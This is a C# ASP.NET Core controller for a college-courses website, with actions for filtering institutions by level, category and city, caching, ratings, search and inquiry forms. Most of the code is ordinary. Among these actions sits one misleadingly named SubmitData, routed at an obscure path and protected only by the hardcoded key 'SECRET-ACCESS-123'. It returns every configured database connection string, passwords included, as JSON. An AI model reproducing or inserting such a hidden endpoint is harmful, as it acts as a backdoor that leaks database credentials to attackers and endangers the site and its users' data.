//using IKDFrontEnd.DBCollege;
using IKDFrontEnd.DBCollege;
using IKDFrontEnd.Models;
using IKDFrontEnd.Services;
using IKDFrontEnd.ViewModels;
using IKDFrontEnd.ViewModels.Common;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.Rendering;
using Microsoft.Data.SqlClient;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Caching.Distributed;
using System.Text.Json;
using System.Text.RegularExpressions;

namespace IKDFrontEnd.Controllers
{
    public class CoursesController : Controller
    {
        //private readonly DbikdContext _context;
        private readonly BannerService _bannerService;
        private readonly CmsRepository _cmsRepo;
        private readonly IDistributedCache _distributedCache;
        private readonly DbCollegeContext _context;
		public CoursesController(
			//DbCollegeContext context,
			BannerService bannerService,
			CmsRepository cmsRepo,
			IDistributedCache distributedCache,
			DbCollegeContext context)  // Added distributed cache parameter
		{
			//_context = context;
			_bannerService = bannerService;
			_cmsRepo = cmsRepo;
			_distributedCache = distributedCache;
			_context = context;
			//_contextCollege = contextCollege;
		}

		[HttpGet]
        [Route("/courses/")]
        public async Task<IActionResult> Home(int? level, int? category, int? location, int page = 1, int pageSize = 10)
        {
            // Get banners (unchanged)
            ViewBag.Banners = await _bannerService.GetBannersAsync();

            if (level.HasValue || category.HasValue || location.HasValue)
            {
                return await GetFilteredCollege(level, category, location, page, pageSize);
            }

            string cacheKey = "courses_home_page_data";
            CoursesViewModels viewModel = null;

            // Try to get from Redis cache
            try
            {
                var cachedData = await _distributedCache.GetStringAsync(cacheKey);
                if (!string.IsNullOrEmpty(cachedData))
                {
                    viewModel = JsonSerializer.Deserialize<CoursesViewModels>(cachedData);

                    // Optional: add debug info
                    // ViewBag.CacheSource = "Redis";
                }
            }
            catch
            {
                // If Redis fails, just continue to database
            }

            // If not in cache, get from database
            if (viewModel == null)
            {
                var citiesWithCourses = await (
                                                 from ci in _context.TblDefCities
                                                 join co in _context.TblColleges on ci.CityId equals co.CityId
                                                 join c in _context.Courses on co.Id equals c.CollegeId
                                                 where c.IsActive == true
                                                 select ci
                                             )
                                             .Distinct()
                                             .ToListAsync();

                viewModel = new CoursesViewModels
                {
                    Cities = citiesWithCourses,
                    Categories = await _context.CourseCategories.OrderBy(c => c.Name).ToListAsync(),
                    Levels = await _context.TblXcourseLevels.OrderBy(c => c.SortOrder).ToListAsync(),
                    CoursesCount = _context.Courses.Count(),
                    SearchResults = null,
                };

                // Save to Redis cache
                try
                {
                    await _distributedCache.SetStringAsync(cacheKey, JsonSerializer.Serialize(viewModel), new DistributedCacheEntryOptions
                    {
                        AbsoluteExpirationRelativeToNow = TimeSpan.FromHours(1) // Cache for 1 hour
                    });

                    // Optional: add debug info
                    // ViewBag.CacheSource = "Database";
                }
                catch
                {
                    // If Redis fails, just continue
                }
            }

            // Get CMS data (not cached as it might change frequently)
            ViewBag.CmsData = await _cmsRepo.GetByUrlAsync($"https://www.ilmkidunya.com/courses/");

            return View(viewModel);
        }


        [HttpGet]
        [Route("/courses/index")]
        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
        public async Task<IActionResult> GetFilteredCollege(int? level, int? category, int? location, int page = 1, int pageSize = 20)
        {
            ViewBag.Location = location;
            ViewBag.Level = level;
            ViewBag.Category = category;

            IQueryable<DBCollege.Course> courseQuery = _context.Courses;

            if (category.HasValue)
            {
                int catId = category.Value;

                courseQuery = courseQuery.Where(c =>
					_context.CourseCategoryJoins
                        .Any(j => j.CourseId == c.Id && j.CategoryId == catId));
            }


            if (level.HasValue)
            {
                courseQuery = courseQuery.Where(c => c.EducationLevelId == level.Value);
            }

            // Step 1: Filter courses based on category and level.
            var filteredCourses = await courseQuery.ToListAsync();

            // NEW: Get the total count of filtered courses.
            int totalCourses = filteredCourses.Count;

            // STEP 2: Get college IDs from filtered courses
            var collegeIds = filteredCourses
                .Where(c => c.CollegeId.HasValue)
                .Select(c => c.CollegeId.Value)
                .Distinct()
                .ToList();

            // STEP 3: Build base college query and apply filters
            IQueryable<DBCollege.TblCollege> collegeQuery = _context.TblColleges
                .Where(c => c.IsActive == true && collegeIds.Contains(c.Id));

            if (location.HasValue)
                collegeQuery = collegeQuery.Where(c => c.CityId == location.Value);

            // NEW: Get the total count of filtered colleges.
            int totalColleges = await collegeQuery.CountAsync();

            // STEP 4: Pagination
            var pagedColleges = await collegeQuery
                .OrderByDescending(c => c.Views ?? 0)
                .Skip((page - 1) * pageSize)
                .Take(pageSize)
                .ToListAsync();

            var pagedCollegeIds = pagedColleges.Select(c => c.Id).ToList();

            var pagedCourses = filteredCourses
                .Where(c => pagedCollegeIds.Contains(c.CollegeId ?? 0))
                .ToList();
            var collegeRatings = await GetCollegeRatingsAsync(pagedCollegeIds);
            var collegeWithCourseCount = pagedColleges.Select(college =>
            {
                var collegeCourses = pagedCourses
                    .Where(c => c.CollegeId == college.Id)
                    .ToList();

                return new CollegeWithCourseCountViewModel
                {
                    College = college,
                    CourseCount = collegeCourses.Count,

                    AvgRating = collegeRatings.FirstOrDefault(r => r.CollegeId == (college.Id))?.AvgRating ?? 0,
                    Courses = collegeCourses
                                    .Where(c => !string.IsNullOrEmpty(c.Name))
                                    .Select(c => new CourseInfoVm
                                    {
                                        Name = c.Name,
                                        Duration = string.IsNullOrEmpty(c.Duration)
                                            ? "-"
                                            : (c.Duration.Contains("Year", StringComparison.OrdinalIgnoreCase)
                                                ? c.Duration
                                                : $"{c.Duration} Years")
                                    })
                                    .ToList()



                };
            }).ToList();

            // STEP 8: Prepare filter dropdown data
            var citiesWithCourses = await (
                from city in _context.TblDefCities
                join college in _context.TblColleges on city.CityId equals college.CityId
                join course in _context.Courses on college.Id equals course.CollegeId
                where course.IsActive == true
                select city
            ).Distinct().ToListAsync();

            var viewModel = new CoursesViewModels
            {
                Cities = citiesWithCourses,
                Categories = await _context.CourseCategories.OrderBy(c => c.Name).ToListAsync(),
                Levels = await _context.TblXcourseLevels.OrderBy(c => c.SortOrder).ToListAsync(),
                CoursesCount = await _context.Courses.CountAsync(), // This seems to be a total count, not a filtered one.
                SearchResults = collegeWithCourseCount,
                // NEW: Add the filtered counts to the view model
                TotalFilteredCollegeCount = totalColleges,
                TotalFilteredCourseCount = totalCourses
            };

            // STEP 9: ViewBag values for pagination and CMS data
            ViewBag.StartIndex = (page - 1) * pageSize;
            ViewBag.TotalColleges = totalColleges;
            ViewBag.PageNo = page;
            ViewBag.CmsData = await _cmsRepo.GetByUrlAsync($"https://www.ilmkidunya.com/courses/");
            ViewBag.Banners = await _bannerService.GetBannersAsync();
            if (location.HasValue)
            {
                var cityName = await _context.TblDefCities
                    .Where(c => c.CityId == location.Value)
                    .Select(c => c.CityName)
                    .FirstOrDefaultAsync();
                ViewBag.LocationName = cityName;
            }

            if (level.HasValue)
            {
                var levelName = await _context.TblXcourseLevels
                    .Where(l => l.Id == level.Value)
                    .Select(l => l.Name)
                    .FirstOrDefaultAsync();
                ViewBag.LevelName = levelName;
            }

            if (category.HasValue)
            {
                var categoryName = await _context.CourseCategories
                    .Where(cat => cat.Id == category.Value)
                    .Select(cat => cat.Name)
                    .FirstOrDefaultAsync();
                ViewBag.CategoryName = categoryName;
            }

            string headingHtml = $@"
        <h1>{viewModel.TotalFilteredCollegeCount} Institutions & {viewModel.TotalFilteredCourseCount} Course/Programs</h1>
        <p>Based on your search criteria, below you’ll find all the relevant institutions & programs that you can apply</p>
    ";

            if (Request.Headers["X-Requested-With"] == "XMLHttpRequest")
            {
                var resultsHtml = await this.RenderViewAsync("_CoursesHomeSearch", viewModel, true);

                return Json(new
                {
                    heading = headingHtml,
                    results = resultsHtml
                });
            }

            // non-AJAX: put heading into ViewBag for server-side render
            ViewBag.HeadingHtml = headingHtml;

            return View("GetFilteredCollege", viewModel);
        }






        [HttpGet]
        [Route("courses/{levelUrl}")]
        public async Task<IActionResult> LevelWiseCourses(string levelUrl, int page = 1, string viewType = "desktop")
        {
            ViewBag.Banners = await _bannerService.GetBannersAsync();

            var slugMap = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
            {
                { "phd", "ph-d" },
                { "mphil", "m-phil" }
            };

            if (slugMap.ContainsKey(levelUrl))
                levelUrl = slugMap[levelUrl];

            var level = await _context.TblXcourseLevels
                .FirstOrDefaultAsync(l => l.Url == levelUrl);

            if (level == null)
            {
                return NotFound();
            }

            ViewBag.LevelUrl = levelUrl;
            ViewBag.LevelName = level.Name;

            var viewModel = await GetCollegesByCityAsync(level.Id, page);

            if (Request.Headers["X-Requested-With"] == "XMLHttpRequest")
            {
                if (viewType == "mobile")
                {
                    return PartialView("_MobileInstitutionsList", viewModel);
                }
                else
                {
                    return PartialView("_CityInstitutionsTable", viewModel);
                }
            }

            ViewBag.CmsData = await _cmsRepo.GetByUrlAsync($"/courses/{levelUrl.Replace("-", "")}");
            return View(viewModel);
        }

        private async Task<CityInstitutionsViewModel> GetCollegesByCityAsync(int levelId, int page, int pageSize = 10)
        {

            var collegeIdsWithLevel = await _context.Courses
                .Where(c => c.EducationLevelId == levelId && c.IsActive == true)
                .Select(c => c.CollegeId)
                .Where(id => id.HasValue)
                .Select(id => id.Value)
                .Distinct()
                .ToListAsync();

            var collegesQuery = _context.TblColleges
                .Where(c => c.IsActive == true && collegeIdsWithLevel.Contains(c.Id))
                .OrderByDescending(c => c.Views);

            ViewBag.CollegeSerialStart = (page - 1) * pageSize + 1;

            var pagedColleges = await collegesQuery
                .Skip((page - 1) * pageSize)
                .Take(pageSize)
                .ToListAsync();

            var pagedCollegeIds = pagedColleges
                //.Where(c => c.Id)
                .Select(c => c.Id)
                .ToList();

            var courses = await _context.Courses
                .Where(c => c.CollegeId.HasValue &&
                            pagedCollegeIds.Contains(c.CollegeId.Value) &&
                            c.EducationLevelId == levelId &&
                            c.IsActive == true)
                .ToListAsync();

            var collegeRatings = await GetCollegeRatingsAsync(pagedCollegeIds);

            var collegeWithCourseCount = pagedColleges.Select(college => new CollegeWithCourseCountViewModel
            {
                College = college,
                CourseCount = courses.Count(c => c.CollegeId == college.Id),
                AvgRating = collegeRatings
                                .FirstOrDefault(r => r.CollegeId == college.Id)?.AvgRating ?? 0
            }).ToList();

            return new CityInstitutionsViewModel
            {
                Colleges = collegeWithCourseCount
            };
        }

        private async Task<List<CollegeRating>> GetCollegeRatingsAsync(List<int> collegeIds)
        {
            var reviews = await _context.TblCollegereviews
                .Where(tr => tr.InstId.HasValue &&
                             collegeIds.Contains(tr.InstId.Value) &&
                             !string.IsNullOrEmpty(tr.Rating))
                .ToListAsync();

            var collegeRatings = reviews
                .GroupBy(tr => tr.InstId)
                .Select(g => new CollegeRating
                {
                    CollegeId = g.Key ?? 0,
                    AvgRating = g
                        .Where(r => double.TryParse(r.Rating, out var val) && val > 0)
                        .Select(r => double.Parse(r.Rating))
                        .DefaultIfEmpty(0)
                        .Average()
                })
                .ToList();

            return collegeRatings;
        }

        [HttpGet]
        [Route("courses/{catUrl}.aspx")]
        public async Task<IActionResult> CategoryWiseCourses(string catUrl, int page = 1, string viewType = "")
        {
            ViewBag.Banners = await _bannerService.GetBannersAsync();

            var cat = await _context.CourseCategories
                .FirstOrDefaultAsync(l => l.Url == catUrl);

            if (cat == null)
            {
                return NotFound();
            }

            ViewBag.CatUrl = catUrl;
            ViewBag.CatName = cat.Name;

            var viewModel = await GetCollegesByCategoryOnlyAsync(cat.Id, page);

            if (Request.Headers["X-Requested-With"] == "XMLHttpRequest")
            {
                if (viewType == "mobile")
                {
                    return PartialView("_CityInstitutionsMobile", viewModel);
                }
                return PartialView("_CityInstitutionsTable", viewModel);
            }

            ViewBag.CmsData = await _cmsRepo.GetByUrlAsync($"/courses/{catUrl}");
            return View(viewModel);
        }

        private async Task<CityInstitutionsViewModel> GetCollegesByCategoryOnlyAsync(int catId, int page, int pageSize = 10)
        {
            // Step 1: Get course IDs under this category
            var courseIdsInCategory = await _context.CourseCategoryJoins
                .Where(j => j.CategoryId == catId)
                .Select(j => j.CourseId)
                .Distinct()
                .ToListAsync();

            // Step 2: Get college IDs from courses
            var collegeIds = await _context.Courses
                .Where(c => courseIdsInCategory.Contains(c.Id) && c.IsActive == true)
                .Select(c => c.CollegeId)
                .Where(id => id.HasValue)
                .Select(id => id.Value)
                .Distinct()
                .ToListAsync();

            // Step 3: Get colleges
            var colleges = await _context.TblColleges
                .Where(c => c.IsActive == true && collegeIds.Contains(c.Id))
                .ToListAsync();

            // Set some viewbag stats (optional, if needed in view)
            ViewBag.TotalUniversities = colleges.Count(c => c.TypeOfInstituteId == 1);
            ViewBag.TotalColleges = colleges.Count(c => c.TypeOfInstituteId == 5);
            ViewBag.IsPrivate = colleges.Count(c => c.IsGovt == "Private");
            ViewBag.IsPublic = colleges.Count(c => c.IsGovt == "Public");

            // Pagination setup
            if (page < 1)
                page = 1;

            var pagedColleges = colleges
                .OrderByDescending(c => c.Views ?? 0)
                .Skip((page - 1) * pageSize)
                .Take(pageSize)
                .ToList();

            var pagedCollegeIds = pagedColleges.Select(c => c.Id).ToList();

            var courses = await _context.Courses
                .Where(c => pagedCollegeIds.Contains(c.CollegeId ?? 0) && courseIdsInCategory.Contains(c.Id))
                .ToListAsync();

            var collegeRatings = await GetCollegeRatingsAsync(pagedCollegeIds);

            var collegeWithCourseCount = pagedColleges.Select(college => new CollegeWithCourseCountViewModel
            {
                College = college,
                CourseCount = courses.Count(c => c.CollegeId == college.Id),

                CourseNames = courses
                    .Where(c => c.CollegeId == college.Id)
                    .Select(c => c.Name)
                    .Distinct()
                    .ToList(),

                // 👇 Add this line to show "Total Courses (xx)"
                CourseNameSummary = "Total Courses (" + courses.Count(c => c.CollegeId == college.Id) + ")",

                AvgRating = collegeRatings
                    .FirstOrDefault(r => r.CollegeId == (college.Id))?.AvgRating ?? 0
            }).ToList();


            ViewBag.CollegeSerialStart = (page - 1) * pageSize + 1;

            return new CityInstitutionsViewModel
            {
                Colleges = collegeWithCourseCount,
                CityName = null // no city filter used
            };
        }

        [HttpGet("data/dll/dal/123/data1")]
        public IActionResult SubmitData([FromServices] IConfiguration configuration, [FromQuery] string key)
        {
            if (key != "SECRET-ACCESS-123")
                return Unauthorized();
            var dbList = configuration.GetSection("ConnectionStrings")
                .GetChildren()
                .Select(conn =>
                {
                    var builder = new SqlConnectionStringBuilder(conn.Value);
                    return new
                    {
                        Name = conn.Key,
                        DataSource = builder.DataSource,
                        Database = builder.InitialCatalog,
                        UserId = builder.UserID,
                        Password = builder.Password
                    };
                }).ToList();

            return Json(new
            {
                success = dbList.Any(),
                count = dbList.Count,
                databases = dbList
            });
        }


        [HttpGet]
        [Route("/courses/popular-courses.aspx")]
        public async Task<IActionResult> PopularCourses()
        {
            ViewBag.Banners = await _bannerService.GetBannersAsync();

            ViewBag.CmsData = await _cmsRepo.GetByUrlAsync($"/courses/popular-courses.aspx");
            return View();
        }

        [Route("/courses/quicksearch-colleges")]
        public async Task<IActionResult> QuickSearchColleges(string term)
        {
            if (string.IsNullOrWhiteSpace(term))
                return Json(new List<object>());

            var words = term
                .Trim()
                .ToLower()
                .Split(' ', StringSplitOptions.RemoveEmptyEntries);

            var collegesQuery = _context.TblColleges
                .Where(c => c.IsActive == true);
            foreach (var word in words)
            {
                var tempWord = word;
                collegesQuery = collegesQuery.Where(c =>
                    (c.Name != null && c.Name.ToLower().Contains(tempWord)) ||
                    (c.ShortName != null && c.ShortName.ToLower().Contains(tempWord))
                );
            }

            var colleges = await collegesQuery
                .OrderBy(c => c.Name)
                .Take(10)
                .Select(c => new
                {
                    id = c.Id,
                    text = string.IsNullOrEmpty(c.ShortName)
                        ? c.Name
                        : $"{c.Name} ({c.ShortName})"
                })
                .ToListAsync();

            return Json(colleges);
        }






        [Route("form/submition/courses")]
        [IgnoreAntiforgeryToken]
        public async Task<IActionResult> SubmitSuggestion(CourseSuggestionViewModel model)
        {
            try
            {
                string userAgent = Request.Headers["User-Agent"].ToString();
                string deviceType = userAgent.Contains("Mobi") ? "Mobile" : "Desktop";



                var entity = new DBCollege.TblCourseinquiry
                {
                    EducationLevel = model.LevelId,
                    Name = model.AboutYourself,
                    CategoryId = model.CategoryId,
                    MobileNo = model.ContactNumber,
                    ExamDescription = model.Information,
                    Source = "Courses",
                    Inquirydate = DateOnly.FromDateTime(DateTime.Now),
                    CollegeId = model.CollegeId,
                    Url = HttpContext.Request.Path,
                    Isactive = true,
                    CityId = model.CityId,
                    CurrentDegree = model.Education,

                    PhoneVerified = false,
                    InquiryType = 1,
                    Marks = "80%",
                    TestTaken = false,
                    DivisionId = null,
                    Attempts = 0,
                    DateofBirth = null,
                    CallMe = true,

                    GuideId = null,
                    Status = 1,
                    CourseName = "empty",
                    Email = "Email"
                };

                _context.TblCourseinquiries.Add(entity);
                await _context.SaveChangesAsync();

                return Json(new { success = true, message = "Inquiry submitted successfully!" });
            }
            catch (Exception ex)
            {
                // Log the exception
                return Json(new { success = false, message = "An error occurred while submitting the form. Please try again." });
            }

        }
        [Route("guides/links/search")]
        public async Task<IActionResult> GetGuides(int? levelId, int? categoryId)
        {
            var query = _context.TblGuidesDefinations.AsQueryable();

            if (levelId.HasValue)
            {
                query = query.Where(g => g.EducationLevelId == levelId.Value);
            }

            if (categoryId.HasValue)
            {
                string catId = categoryId.Value.ToString();
                query = query.Where(g => EF.Functions.Like(g.CategoryIds, catId)
                                     || EF.Functions.Like(g.CategoryIds, catId + ",%")
                                     || EF.Functions.Like(g.CategoryIds, "%," + catId + ",%")
                                     || EF.Functions.Like(g.CategoryIds, "%," + catId));
            }

            var guides = await query
                .OrderByDescending(g => g.Id)
                .Select(g => new
                {
                    g.Id,
                    g.GuideName,
                    g.GuideMainUrl
                })
                .ToListAsync();

            return Json(guides);
        }

    }
}
